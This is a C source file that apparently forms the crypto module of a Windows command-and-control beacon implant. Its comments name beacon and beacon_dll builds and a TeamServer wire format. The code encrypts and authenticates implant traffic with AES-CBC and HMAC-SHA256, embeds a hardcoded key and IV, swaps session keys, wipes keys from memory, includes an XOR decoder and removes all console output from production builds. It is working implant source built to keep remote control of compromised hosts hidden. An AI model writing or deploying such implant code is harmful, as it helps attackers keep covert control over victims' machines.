#include "crypto.h"
#include "common.h"

// ══════════════════════════════════════════════════════════════════════
// Conditional logging — only emitted when building with BEACON_TEST
// Production builds (beacon, beacon_dll) have no console output.
// ══════════════════════════════════════════════════════════════════════
#ifdef BEACON_TEST
  #define DBG(fmt, ...) printf(fmt, ##__VA_ARGS__)
#else
  #define DBG(fmt, ...) ((void)0)
#endif

static BYTE aes_key[KEYSIZE] = {0x3E, 0x31, 0xF4, 0x00, 0x50, 0xB6, 0x6E, 0xB8,
                                0xF6, 0x98, 0x95, 0x27, 0x43, 0x27, 0xC0, 0x55,
                                0xEB, 0xDB, 0xE1, 0x7F, 0x05, 0xFE, 0x65, 0x6D,
                                0x0F, 0xA6, 0x5B, 0x00, 0x33, 0xE6, 0xD9, 0x0B};
static BYTE aes_iv[IVSIZE] = {0xB4, 0xC8, 0x1D, 0x1D, 0x14, 0x7C, 0xCB, 0xFA,
                              0x07, 0x42, 0xD9, 0xED, 0x1A, 0x86, 0xD9, 0xCD};

// helper: dump first N bytes as hex (debug builds only)
static VOID hex_dump(const char *label, const BYTE *data, DWORD len,
                     DWORD maxBytes) {
  DBG("[CRYPTO] %s (%lu bytes): ", label, len);
#ifdef BEACON_TEST
  DWORD show = (len < maxBytes) ? len : maxBytes;
  for (DWORD i = 0; i < show; i++)
    DBG("%02X", data[i]);
  if (len > maxBytes)
    DBG("...");
  DBG("\n");
#else
  (void)label; (void)data; (void)len; (void)maxBytes;
#endif
}

// ══════════════════════════════════════════════════════════════════════
// HMAC-SHA256 via BCrypt — used for Encrypt-then-MAC
// ══════════════════════════════════════════════════════════════════════
static BOOL hmac_sha256(const BYTE *key, DWORD keyLen,
                        const BYTE *data, DWORD dataLen,
                        BYTE outMac[HMAC_SIZE]) {
  BCRYPT_ALG_HANDLE  hAlg  = NULL;
  BCRYPT_HASH_HANDLE hHash = NULL;
  NTSTATUS status;
  BOOL ok = FALSE;
  DWORD cbHashObj = 0, cbResult = 0;
  PBYTE pbHashObj = NULL;

  status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_SHA256_ALGORITHM, NULL,
                                       BCRYPT_ALG_HANDLE_HMAC_FLAG);
  if (!NT_SUCCESS(status)) goto _hmac_end;

  status = BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH,
                             (PBYTE)&cbHashObj, sizeof(DWORD), &cbResult, 0);
  if (!NT_SUCCESS(status)) goto _hmac_end;

  pbHashObj = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbHashObj);
  if (!pbHashObj) goto _hmac_end;

  status = BCryptCreateHash(hAlg, &hHash, pbHashObj, cbHashObj,
                            (PBYTE)key, keyLen, 0);
  if (!NT_SUCCESS(status)) goto _hmac_end;

  status = BCryptHashData(hHash, (PBYTE)data, dataLen, 0);
  if (!NT_SUCCESS(status)) goto _hmac_end;

  status = BCryptFinishHash(hHash, outMac, HMAC_SIZE, 0);
  if (!NT_SUCCESS(status)) goto _hmac_end;

  ok = TRUE;

_hmac_end:
  if (hHash)    BCryptDestroyHash(hHash);
  if (pbHashObj) HeapFree(GetProcessHeap(), 0, pbHashObj);
  if (hAlg)     BCryptCloseAlgorithmProvider(hAlg, 0);
  return ok;
}

// Constant-time comparison to prevent timing attacks
static BOOL hmac_verify(const BYTE *computed, const BYTE *received) {
  volatile BYTE diff = 0;
  for (int i = 0; i < HMAC_SIZE; i++)
    diff |= computed[i] ^ received[i];
  return (diff == 0);
}

static BOOL InstallAesEncryption(PAES pAes) {
  BOOL bSTATE = TRUE;
  BCRYPT_ALG_HANDLE hAlgorithm = NULL;
  BCRYPT_KEY_HANDLE hKeyHandle = NULL;
  ULONG cbResult = 0;
  DWORD dwBlockSize = 0;
  DWORD cbKeyObject = 0;
  PBYTE pbKeyObject = NULL;
  PBYTE pbCipher = NULL;
  DWORD cbCipher = 0;
  NTSTATUS STATUS = 0;

  DBG("[CRYPTO] === InstallAesEncryption ===\n");
  hex_dump("Key", pAes->pKey, KEYSIZE, 32);
  hex_dump("IV (before)", pAes->pIv, IVSIZE, 16);
  hex_dump("Plaintext", pAes->pPlainText, pAes->dwPlainSize, 64);

  STATUS =
      BCryptOpenAlgorithmProvider(&hAlgorithm, BCRYPT_AES_ALGORITHM, NULL, 0);
  if (!NT_SUCCESS(STATUS)) {
    DBG("[CRYPTO] BCryptOpenAlgorithmProvider FAILED: 0x%08lX\n", STATUS);
    bSTATE = FALSE;
    goto _End;
  }

  STATUS = BCryptGetProperty(hAlgorithm, BCRYPT_OBJECT_LENGTH,
                             (PBYTE)&cbKeyObject, sizeof(DWORD), &cbResult, 0);
  if (!NT_SUCCESS(STATUS)) {
    DBG("[CRYPTO] BCryptGetProperty(OBJECT_LENGTH) FAILED: 0x%08lX\n", STATUS);
    bSTATE = FALSE;
    goto _End;
  }

  STATUS = BCryptGetProperty(hAlgorithm, BCRYPT_BLOCK_LENGTH,
                             (PBYTE)&dwBlockSize, sizeof(DWORD), &cbResult, 0);
  if (!NT_SUCCESS(STATUS)) {
    DBG("[CRYPTO] BCryptGetProperty(BLOCK_LENGTH) FAILED: 0x%08lX\n", STATUS);
    bSTATE = FALSE;
    goto _End;
  }

  DBG("[CRYPTO] BlockSize=%lu  KeyObjectSize=%lu\n", dwBlockSize, cbKeyObject);
  if (dwBlockSize != 16) {
    DBG("[CRYPTO] UNEXPECTED block size %lu != 16\n", dwBlockSize);
    bSTATE = FALSE;
    goto _End;
  }

  pbKeyObject = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbKeyObject);
  if (!pbKeyObject) {
    DBG("[CRYPTO] HeapAlloc(KeyObject) FAILED\n");
    bSTATE = FALSE;
    goto _End;
  }

  STATUS = BCryptSetProperty(hAlgorithm, BCRYPT_CHAINING_MODE,
                             (PBYTE)BCRYPT_CHAIN_MODE_CBC,
                             sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
  if (!NT_SUCCESS(STATUS)) {
    DBG("[CRYPTO] BCryptSetProperty(CBC) FAILED: 0x%08lX\n", STATUS);
    bSTATE = FALSE;
    goto _End;
  }

  STATUS =
      BCryptGenerateSymmetricKey(hAlgorithm, &hKeyHandle, pbKeyObject,
                                 cbKeyObject, (PBYTE)pAes->pKey, KEYSIZE, 0);
  if (!NT_SUCCESS(STATUS)) {
    DBG("[CRYPTO] BCryptGenerateSymmetricKey FAILED: 0x%08lX\n", STATUS);
    bSTATE = FALSE;
    goto _End;
  }

  // sizing call — use throwaway IV copy so real IV stays clean
  BYTE ivTmp[IVSIZE];
  memcpy(ivTmp, pAes->pIv, IVSIZE);
  STATUS = BCryptEncrypt(hKeyHandle, (PUCHAR)pAes->pPlainText,
                         (ULONG)pAes->dwPlainSize, NULL, ivTmp, IVSIZE, NULL, 0,
                         &cbCipher, BCRYPT_BLOCK_PADDING);
  if (!NT_SUCCESS(STATUS)) {
    DBG("[CRYPTO] BCryptEncrypt(sizing) FAILED: 0x%08lX\n", STATUS);
    bSTATE = FALSE;
    goto _End;
  }

  DBG("[CRYPTO] Cipher output size will be %lu bytes\n", cbCipher);

  pbCipher = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbCipher);
  if (!pbCipher) {
    DBG("[CRYPTO] HeapAlloc(Cipher) FAILED\n");
    bSTATE = FALSE;
    goto _End;
  }

  // real encrypt — IV is still intact
  hex_dump("IV (before real encrypt)", pAes->pIv, IVSIZE, 16);
  STATUS = BCryptEncrypt(hKeyHandle, (PUCHAR)pAes->pPlainText,
                         (ULONG)pAes->dwPlainSize, NULL, pAes->pIv, IVSIZE,
                         pbCipher, cbCipher, &cbResult, BCRYPT_BLOCK_PADDING);
  if (!NT_SUCCESS(STATUS)) {
    DBG("[CRYPTO] BCryptEncrypt(real) FAILED: 0x%08lX\n", STATUS);
    bSTATE = FALSE;
    goto _End;
  }

  hex_dump("IV (after encrypt)", pAes->pIv, IVSIZE, 16);
  hex_dump("Ciphertext", pbCipher, cbCipher, 64);
  DBG("[CRYPTO] Encrypt SUCCESS — %lu bytes in, %lu bytes out\n",
      pAes->dwPlainSize, cbCipher);

_End:
  if (hKeyHandle)
    BCryptDestroyKey(hKeyHandle);
  if (hAlgorithm)
    BCryptCloseAlgorithmProvider(hAlgorithm, 0);
  if (pbKeyObject)
    HeapFree(GetProcessHeap(), 0, pbKeyObject);
  if (pbCipher != NULL && bSTATE) {
    pAes->pCipherText = pbCipher;
    pAes->dwCipherSize = cbCipher;
  } else if (pbCipher) {
    HeapFree(GetProcessHeap(), 0, pbCipher);
  }
  return bSTATE;
}

static BOOL InstallAesDecryption(PAES pAes) {
  BOOL bSTATE = TRUE;
  BCRYPT_ALG_HANDLE hAlgorithm = NULL;
  BCRYPT_KEY_HANDLE hKeyHandle = NULL;
  ULONG cbResult = 0;
  DWORD dwBlockSize = 0;
  DWORD cbKeyObject = 0;
  PBYTE pbKeyObject = NULL;
  PBYTE pbPlain = NULL;
  DWORD cbPlain = 0;
  NTSTATUS STATUS = 0;

  DBG("[CRYPTO] === InstallAesDecryption ===\n");
  hex_dump("Key", pAes->pKey, KEYSIZE, 32);
  hex_dump("IV (before)", pAes->pIv, IVSIZE, 16);
  hex_dump("Ciphertext", pAes->pCipherText, pAes->dwCipherSize, 64);

  STATUS =
      BCryptOpenAlgorithmProvider(&hAlgorithm, BCRYPT_AES_ALGORITHM, NULL, 0);
  if (!NT_SUCCESS(STATUS)) {
    DBG("[CRYPTO] BCryptOpenAlgorithmProvider FAILED: 0x%08lX\n", STATUS);
    bSTATE = FALSE;
    goto _End;
  }

  STATUS = BCryptGetProperty(hAlgorithm, BCRYPT_OBJECT_LENGTH,
                             (PBYTE)&cbKeyObject, sizeof(DWORD), &cbResult, 0);
  if (!NT_SUCCESS(STATUS)) {
    DBG("[CRYPTO] BCryptGetProperty(OBJECT_LENGTH) FAILED: 0x%08lX\n", STATUS);
    bSTATE = FALSE;
    goto _End;
  }

  STATUS = BCryptGetProperty(hAlgorithm, BCRYPT_BLOCK_LENGTH,
                             (PBYTE)&dwBlockSize, sizeof(DWORD), &cbResult, 0);
  if (!NT_SUCCESS(STATUS)) {
    DBG("[CRYPTO] BCryptGetProperty(BLOCK_LENGTH) FAILED: 0x%08lX\n", STATUS);
    bSTATE = FALSE;
    goto _End;
  }

  DBG("[CRYPTO] BlockSize=%lu  KeyObjectSize=%lu\n", dwBlockSize, cbKeyObject);
  if (dwBlockSize != 16) {
    DBG("[CRYPTO] UNEXPECTED block size %lu != 16\n", dwBlockSize);
    bSTATE = FALSE;
    goto _End;
  }

  pbKeyObject = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbKeyObject);
  if (!pbKeyObject) {
    DBG("[CRYPTO] HeapAlloc(KeyObject) FAILED\n");
    bSTATE = FALSE;
    goto _End;
  }

  STATUS = BCryptSetProperty(hAlgorithm, BCRYPT_CHAINING_MODE,
                             (PBYTE)BCRYPT_CHAIN_MODE_CBC,
                             sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
  if (!NT_SUCCESS(STATUS)) {
    DBG("[CRYPTO] BCryptSetProperty(CBC) FAILED: 0x%08lX\n", STATUS);
    bSTATE = FALSE;
    goto _End;
  }

  STATUS =
      BCryptGenerateSymmetricKey(hAlgorithm, &hKeyHandle, pbKeyObject,
                                 cbKeyObject, (PBYTE)pAes->pKey, KEYSIZE, 0);
  if (!NT_SUCCESS(STATUS)) {
    DBG("[CRYPTO] BCryptGenerateSymmetricKey FAILED: 0x%08lX\n", STATUS);
    bSTATE = FALSE;
    goto _End;
  }

  // sizing call — throwaway IV copy
  BYTE ivTmp[IVSIZE];
  memcpy(ivTmp, pAes->pIv, IVSIZE);
  STATUS = BCryptDecrypt(hKeyHandle, (PUCHAR)pAes->pCipherText,
                         (ULONG)pAes->dwCipherSize, NULL, ivTmp, IVSIZE, NULL,
                         0, &cbPlain, BCRYPT_BLOCK_PADDING);
  if (!NT_SUCCESS(STATUS)) {
    DBG("[CRYPTO] BCryptDecrypt(sizing) FAILED: 0x%08lX\n", STATUS);
    bSTATE = FALSE;
    goto _End;
  }

  DBG("[CRYPTO] Plaintext output size will be %lu bytes\n", cbPlain);

  pbPlain = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbPlain);
  if (!pbPlain) {
    DBG("[CRYPTO] HeapAlloc(Plain) FAILED\n");
    bSTATE = FALSE;
    goto _End;
  }

  // real decrypt — IV is still intact
  hex_dump("IV (before real decrypt)", pAes->pIv, IVSIZE, 16);
  STATUS = BCryptDecrypt(hKeyHandle, (PUCHAR)pAes->pCipherText,
                         (ULONG)pAes->dwCipherSize, NULL, pAes->pIv, IVSIZE,
                         pbPlain, cbPlain, &cbResult, BCRYPT_BLOCK_PADDING);
  if (!NT_SUCCESS(STATUS)) {
    DBG("[CRYPTO] BCryptDecrypt(real) FAILED: 0x%08lX\n", STATUS);
    bSTATE = FALSE;
    goto _End;
  }

  hex_dump("IV (after decrypt)", pAes->pIv, IVSIZE, 16);
  hex_dump("Plaintext", pbPlain, cbResult, 64);
  DBG("[CRYPTO] Decrypt SUCCESS — %lu bytes in, %lu bytes out\n",
      pAes->dwCipherSize, cbResult);

_End:
  if (hKeyHandle)
    BCryptDestroyKey(hKeyHandle);
  if (hAlgorithm)
    BCryptCloseAlgorithmProvider(hAlgorithm, 0);
  if (pbKeyObject)
    HeapFree(GetProcessHeap(), 0, pbKeyObject);
  if (pbPlain != NULL && bSTATE) {
    pAes->pPlainText = pbPlain;
    pAes->dwPlainSize = cbResult; // use actual decrypted size, not padded
  } else if (pbPlain) {
    HeapFree(GetProcessHeap(), 0, pbPlain);
  }
  return bSTATE;
}

static BOOL SimpleEncryption(PVOID plain, DWORD plainLen, PBYTE key, PBYTE iv,
                             PVOID *outCipher, DWORD *outLen) {
  AES aes = {0};
  BYTE ivRandom[IVSIZE];

  // Generate a random IV for each encryption (matches TeamServer wire format)
  NTSTATUS rnSt = BCryptGenRandom(NULL, ivRandom, IVSIZE,
                                  BCRYPT_USE_SYSTEM_PREFERRED_RNG);
  if (!NT_SUCCESS(rnSt)) {
    // Fallback: use the static IV if RNG fails (should not happen)
    memcpy(ivRandom, iv, IVSIZE);
  }

  DBG("[CRYPTO] SimpleEncryption: %lu bytes\n", plainLen);
  hex_dump("Random IV", ivRandom, IVSIZE, 16);

  aes.pKey = key;
  aes.pIv = ivRandom;
  aes.pPlainText = (PBYTE)plain;
  aes.dwPlainSize = plainLen;
  if (!InstallAesEncryption(&aes)) {
    DBG("[CRYPTO] SimpleEncryption FAILED\n");
    return FALSE;
  }

  // Wire format: [16-byte IV | ciphertext | 32-byte HMAC-SHA256]
  // HMAC is computed over [IV | ciphertext] (Encrypt-then-MAC)
  DWORD ivCtLen = IVSIZE + aes.dwCipherSize;
  DWORD wireLen = ivCtLen + HMAC_SIZE;
  PBYTE pWire = (PBYTE)HeapAlloc(GetProcessHeap(), 0, wireLen);
  if (!pWire) {
    HeapFree(GetProcessHeap(), 0, aes.pCipherText);
    DBG("[CRYPTO] HeapAlloc(wire) FAILED\n");
    return FALSE;
  }
  memcpy(pWire, ivRandom, IVSIZE);
  memcpy(pWire + IVSIZE, aes.pCipherText, aes.dwCipherSize);
  HeapFree(GetProcessHeap(), 0, aes.pCipherText);

  // Compute HMAC-SHA256 over [IV | ciphertext]
  BYTE mac[HMAC_SIZE];
  if (!hmac_sha256(key, KEYSIZE, pWire, ivCtLen, mac)) {
    HeapFree(GetProcessHeap(), 0, pWire);
    DBG("[CRYPTO] HMAC computation FAILED\n");
    return FALSE;
  }
  memcpy(pWire + ivCtLen, mac, HMAC_SIZE);

  *outCipher = pWire;
  *outLen = wireLen;
  DBG("[CRYPTO] SimpleEncryption OK — %lu -> %lu bytes (IV+CT+HMAC)\n",
      plainLen, *outLen);
  hex_dump("HMAC", mac, HMAC_SIZE, 32);
  return TRUE;
}

static BOOL SimpleDecryption(PVOID cipher, DWORD cipherLen, PBYTE key, PBYTE iv,
                             PVOID *outPlain, DWORD *outLen) {
  AES aes = {0};

  // Wire format: [16-byte IV | ciphertext | 32-byte HMAC-SHA256]
  // Minimum: 16 (IV) + 16 (one AES block) + 32 (HMAC) = 64 bytes
  if (cipherLen <= IVSIZE + HMAC_SIZE) {
    DBG("[CRYPTO] SimpleDecryption: wire too short (%lu <= %d)\n",
        cipherLen, IVSIZE + HMAC_SIZE);
    return FALSE;
  }

  DWORD ivCtLen = cipherLen - HMAC_SIZE;
  PBYTE pReceivedMac = (PBYTE)cipher + ivCtLen;

  // Verify HMAC before decryption (Encrypt-then-MAC: verify first)
  BYTE computedMac[HMAC_SIZE];
  if (!hmac_sha256(key, KEYSIZE, (PBYTE)cipher, ivCtLen, computedMac)) {
    DBG("[CRYPTO] HMAC computation FAILED during verify\n");
    return FALSE;
  }

  if (!hmac_verify(computedMac, pReceivedMac)) {
    DBG("[CRYPTO] HMAC VERIFICATION FAILED — tampered or wrong key\n");
    return FALSE;
  }
  DBG("[CRYPTO] HMAC verified OK\n");

  // Extract IV from wire
  BYTE ivFromWire[IVSIZE];
  memcpy(ivFromWire, cipher, IVSIZE);
  PBYTE actualCipher = (PBYTE)cipher + IVSIZE;
  DWORD actualCipherLen = ivCtLen - IVSIZE;

  DBG("[CRYPTO] SimpleDecryption: %lu bytes (HMAC verified, IV extracted)\n",
      actualCipherLen);
  hex_dump("IV from wire", ivFromWire, IVSIZE, 16);

  aes.pKey = key;
  aes.pIv = ivFromWire;
  aes.pCipherText = actualCipher;
  aes.dwCipherSize = actualCipherLen;
  if (!InstallAesDecryption(&aes)) {
    DBG("[CRYPTO] SimpleDecryption FAILED\n");
    return FALSE;
  }
  *outPlain = aes.pPlainText;
  *outLen = aes.dwPlainSize;
  DBG("[CRYPTO] SimpleDecryption OK — %lu -> %lu bytes\n", actualCipherLen,
      *outLen);
  return TRUE;
}

BOOL aes_encrypt_payload(PBYTE plain, DWORD plainLen, PVOID *outCipher,
                         DWORD *outLen) {
  DBG("[CRYPTO] >>>>>> aes_encrypt_payload called <<<<<<\n");
  return SimpleEncryption(plain, plainLen, aes_key, aes_iv, outCipher, outLen);
}

BOOL aes_decrypt_payload(PBYTE cipher, DWORD cipherLen, PVOID *outPlain,
                         DWORD *outLen) {
  DBG("[CRYPTO] >>>>>> aes_decrypt_payload called <<<<<<\n");
  return SimpleDecryption(cipher, cipherLen, aes_key, aes_iv, outPlain, outLen);
}

VOID crypto_wipe_keys(VOID) {
  DBG("[CRYPTO] Wiping keys from memory\n");
  SecureZeroMemory(aes_key, KEYSIZE);
  SecureZeroMemory(aes_iv, IVSIZE);
}

// ── XOR decode ────────────────────────────────────────────────────────
VOID xor_decode(BYTE *buf, DWORD len, BYTE key) {
  for (DWORD i = 0; i < len; i++)
    buf[i] ^= key;
}

// ── Session key swap ──────────────────────────────────────────────────
BOOL crypto_set_session_key(const BYTE *key, DWORD keyLen,
                            const BYTE *iv, DWORD ivLen) {
  if (keyLen != KEYSIZE || ivLen != IVSIZE) {
    DBG("[CRYPTO] set_session_key: bad sizes key=%lu iv=%lu\n", keyLen, ivLen);
    return FALSE;
  }
  SecureZeroMemory(aes_key, KEYSIZE);
  SecureZeroMemory(aes_iv, IVSIZE);
  memcpy(aes_key, key, KEYSIZE);
  memcpy(aes_iv, iv, IVSIZE);
  DBG("[CRYPTO] Session key installed\n");
  return TRUE;
}